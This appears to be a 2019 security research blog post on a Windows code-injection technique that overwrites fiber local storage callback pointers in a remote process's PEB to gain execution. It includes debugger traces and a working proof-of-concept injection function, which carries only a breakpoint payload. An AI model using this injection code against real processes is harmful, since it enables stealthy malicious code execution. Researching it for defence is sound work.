@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Code Execution via Fiber Local Storage</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Code Execution via Fiber Local Storage</h1>
+			<b><time>2019-08-12</time></b>
+		       
+
+			<div>
+				<p>While working on another research project (post to be released soon, will
+update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
+technique that fit my situation perfectly. Instead of tainting the other post
+with its description and code, I figured I&rsquo;d release a separate post describing
+it here.</p>
+<p>When I say that it&rsquo;s Hexacorn inspired, I mean that the bulk of the strategy is
+similar to everything else you&rsquo;ve probably seen; we open a handle to the remote
+process, allocate some memory, and copy our shellcode into it. At this point we
+simply need to gain control over execution flow; this is where most of
+Hexacorn&rsquo;s techniques come in handy. PROPagate via window properties,
+WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
+great example is Windows Notification Facility via user subscription callbacks
+(at least in modexp&rsquo;s proof of concept), though this one isn&rsquo;t Hexacorns.</p>
+<p>These strategies are also predicated on the process having certain capabilities
+(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
+not all, do not work across sessions or integrity levels. This is obvious and
+expected and frankly quite niche, but in my situation, a requirement.</p>
+<h2 id="fibers">Fibers</h2>
+<p>Fibers are &ldquo;a unit of execution that must be manually scheduled by the
+application&rdquo;[1]. They are essentially register and stack states that can be
+swapped in and out at will, and reflect upon the thread in which they are
+executing. A single thread can be running at most a single fiber at a time, but
+fibers can be hot swapped during execution and their quantum user controlled.</p>
+<p>Fibers can also create and use fiber data. A pointer to this is stored in
+<code>TEB-&gt;NtTib.FiberData</code> and is a per-thread structure. This is initially set
+during a call to <code>ConvertThreadToFiber</code>. Taking a quick look at this:</p>
+<pre tabindex="0"><code>void TestFiber()
+{
+    PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
+    PVOID lpFirstFiber = NULL;
+    memset(lpFiberData, 0x41, 0x10);
+
+    lpFirstFiber = ConvertThreadToFiber(lpFiberData);
+    DebugBreak();
+}
+
+int main()
+{
+    DWORD tid = 0;
+    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &amp;tid);
+    WaitForSingleObject(hThread, INFINITE);
+    return 0;
+}
+</code></pre><p>We need to spawn off the test in a new thread, as the main thread will
+always have a fiber instantiated and the call will fail. If we
+run this in a debugger we can inspect the data after the break:</p>
+<pre tabindex="0"><code>0:000&gt; ~
+.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen
+#  1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen
+0:000&gt; dt _NT_TIB 7ffdd000 FiberData
+ucrtbased!_NT_TIB
+   +0x010 FiberData : 0x002ea9c0 Void
+0:000&gt; dd poi(0x002ea9c0) l5
+002ea998  41414141 41414141 41414141 41414141
+002ea9a8  abababab
+</code></pre><p>In addition to fiber data, fibers also have access to the fiber local storage
+(FLS). For all intents and purposes, this is identical to thread local storage
+(TLS)[2]. This allows all thread fibers access to shared data via a global
+index. The API for this is pretty simple, and very similar to TLS. In the
+following sample, we&rsquo;ll allocate an index and toss some values in it. Using our
+previous example as base:</p>
+<pre tabindex="0"><code>lpFirstFiber = ConvertThreadToFiber(lpFiberData);
+dwIdx = FlsAlloc(NULL);
+FlsSetValue(dwIdx, lpFiberData);
+DebugBreak();
+</code></pre><p>A pointer to this data is stored in the thread&rsquo;s TEB, and can be extracted from
+<code>TEB-&gt;FlsData</code>. From the above example, assume the returned FLS index for this
+data is 6:</p>
+<pre tabindex="0"><code>0:001&gt; ~
+   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
+.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
+0:001&gt; dt _TEB 7ffde000 FlsData
+ntdll!_TEB
+   +0xfb4 FlsData : 0x0049a008 Void
+0:001&gt; dd poi(0x0049a008+(4*8))
+0049a998  41414141 41414141 41414141 41414141
+0049a9a8  abababab
+</code></pre><p>Note that the offset is always the index + 2.</p>
+<h2 id="abusing-fls-callbacks-to-obtain-execution-control">Abusing FLS Callbacks to Obtain Execution Control</h2>
+<p>Let&rsquo;s return to that <code>FlsAlloc</code> call from the above example. Its first
+parameter is a <code>PFLS_CALLBACK_FUNCTION</code>[3] and is used for, according to MSDN:</p>
+<pre tabindex="0"><code>An application-defined function. If the FLS slot is in use, FlsCallback is
+called on fiber deletion, thread exit, and when an FLS index is freed. Specify
+this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
+type defines a pointer to this callback function. 
+</code></pre><p>Well isn&rsquo;t that lovely. These callbacks are stored process wide in
+<code>PEB-&gt;FlsCallback</code>. Let&rsquo;s try it out:</p>
+<pre tabindex="0"><code>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
+</code></pre><p>And fetching it (assuming again an index of 6):</p>
+<pre tabindex="0"><code>0:001&gt; dt _PEB 7ffd8000 FlsCallback
+ucrtbased!_PEB
+   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
+0:001&gt; dd 0x002d51f8 + (2 * 6 * 4) l1
+002d5228  41414141
+</code></pre><p>What happens when we let this run to process exit?</p>
+<pre tabindex="0"><code>0:001&gt; g
+(10a8.1328): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
+eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+41414141 ??              ???
+</code></pre><p>Recall the MSDN comment about <em>when</em> the FLS callback is invoked: <code>..on fiber deletion, thread exit, and when an FLS index is freed</code>. This means that worst
+case our code executes once the process exits and best case following a
+threads exit or call to <code>FlsFree</code>. It&rsquo;s worth reiterating that the primary
+thread for each process will have a fiber instantiated already; it&rsquo;s quite
+possible that this thread isn&rsquo;t around anymore, but this doesn&rsquo;t matter as the
+callbacks are at the process level.</p>
+<p>Another salient point here is the first parameter to the callback function.
+This parameter is the value of whatever was in the indexed slot and is also
+stashed in ECX/RCX before invoking the callback:</p>
+<pre tabindex="0"><code>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
+FlsSetValue(dwIdx, (PVOID)0x42424242);
+DebugBreak();
+</code></pre><p>Which, when executed:</p>
+<pre tabindex="0"><code>(aa8.169c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
+eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+41414141 ??              ???
+</code></pre><p>Under specific circumstances, this can be quite useful.</p>
+<p>Anyway, PoC||GTFO, I&rsquo;ve included some code below. In it, we overwrite the
+<code>msvcrt!_freefls</code> call used to free the FLS buffer.</p>
+<pre tabindex="0"><code>#ifdef _WIN64
+#define FlsCallbackOffset 0x320
+#else
+#define FlsCallbackOffset 0x20c
+#endif
+
+void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess) 
+{
+    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA(&#34;ntdll&#34;), 
+                                                            &#34;NtQueryInformationProcess&#34;);
+    const char *payload = &#34;\xcc\xcc\xcc\xcc&#34;;
+    PROCESS_BASIC_INFORMATION pbi;
+    SIZE_T sCallback = 0, sRetLen = 0;
+    LPVOID lpBuf = NULL;
+
+    //
+    // allocate memory and write in our payload as one would normally do
+    //
+
+    lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);
+
+    // now we need to fetch the remote process PEB
+    NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &amp;pbi,
+                              sizeof(PROCESS_BASIC_INFORMATION), NULL);
+
+    // read the FlsCallback address out of it
+    ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
+                          (LPVOID)&amp;sCallback, sizeof(SIZE_T), &amp;sRetLen);
+    sCallback += 2 * sizeof(SIZE_T);
+
+    // we&#39;re targeting the _freefls call, so overwrite that with our payload
+    // address 
+    WriteProcessMemory(hProcess, (LPVOID)sCallback, &amp;dwNewAddr, sizeof(SIZE_T), &amp;sRetLen);
+}
+</code></pre><p>I tested this on an updated Windows 10 x64 against notepad and mspaint; on
+process exit, the callback is executed and we gain control over execution flow.
+Pretty useful in the end; more on this soon&hellip;</p>
+<h2 id="references">References</h2>
+<p>[0] <a href="http://www.hexacorn.com">http://www.hexacorn.com</a><br>
+[1] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">https://docs.microsoft.com/en-us/windows/win32/procthread/fibers</a><br>
+[2] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a><br>
+[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function">https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function</a></p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
